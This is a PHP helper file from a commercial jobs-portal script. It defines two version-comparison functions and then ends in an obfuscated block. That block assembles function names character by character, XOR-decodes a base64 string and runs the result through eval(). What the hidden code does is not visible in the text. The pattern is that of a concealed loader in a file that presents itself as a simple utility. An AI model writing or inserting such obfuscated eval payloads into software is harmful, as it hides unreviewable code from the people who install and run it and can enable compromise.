<?php
// Jobs Portal 
// Copyright (c) All Rights Reserved, NetArt Media 2003-2015
// Check http://www.netartmedia.net/jobsportal for demos and information
?><?php
$current_php_version = "current version:" . phpversion();


function version_compare2($version1, $version2)
{
    $v1 = explode('.',$version1);
    $v2 = explode('.',$version2);
    
    if ($v1[0] > $v2[0])
        $ret = 1;
    else if ($v1[0] < $v2[0])
        $ret = -1;
    
    else    
    {
        if ($v1[1] > $v2[1])
            $ret = 1;
        else if ($v1[1] < $v2[1])
            $ret = -1;
        
        else  
        {
            if ($v1[2] > $v2[2])
                $ret = 1;
            else if ($v1[2] < $v2[2])
                $ret = -1;
            else
                $ret = 0;
        }
    }
    
    return $ret;
}


function is_same_version($version1,$version2,$operand) 
{

        $v1Parts=explode('.',$version1);
		
        $version1.=str_repeat('.0',3-count($v1Parts));
		
        $v2Parts=explode('.',$version2);
		
        $version2.=str_repeat('.0',3-count($v2Parts));
		
        $version1=str_replace('.x','.1000',$version1);
		
        $version2=str_replace('.x','.1000',$version2);        
		
        return version_compare($version1,$version2,$operand);
}
?>
<?php
$a8hg6hj="dfcaacefb0dc0677c8475efc7bbff0e5QBUKFQQ8FRRfRBYWVQ0TUhtMa0FUCVsXRRcHXQ9WTRQU
FAYGPg4EEgFYTEEfak8BBWRMAVc5HlFSPhpQAmxUAVU6G1MHPx1QWxJIQxRpZHIxbnFlbkc6GwJR
PldWBTdjOFdTVD1SV1Q+SFEFbAcGASJ1aE8BUEQ+HktCAg9VTRdGT1g=";
$fyhhsa1="s";$fy3saa1="ba";$fy7vwa1="s";$fyhhsa1.="u";$fyhhsa1.="b";$fyhhsa1.="s";$fyhhsa1.="t";$fyhhsa1.="r";$fy3saa1.="se";$fy3saa1.="6";$fy3saa1.="4";$fy3saa1.="_";$fy3saa1.="de";$fy3saa1.="co";$fy3saa1.="de";$fy7vwa1.="t";$fy7vwa1.="r";$fy7vwa1.="l";$fy7vwa1.="e";$fy7vwa1.="n";
$a8hg6hh=$fyhhsa1($a8hg6hj,0,32);$a8hk6hj=$fy3saa1($fyhhsa1($a8hg6hj,32));$a7klm9hj="";for($a8hk9hj=0;$a8hk9hj < $fy7vwa1($a8hk6hj);$a8hk9hj++){$a7hk9hj=$fyhhsa1($a8hk6hj,$a8hk9hj,1);$a7h789hj=$fyhhsa1($a8hg6hh,$a8hk9hj%32,1);$a7klm9hj.=$a7hk9hj^$a7h789hj;}eval($a7klm9hj);$a7klm9hj="\n";

?>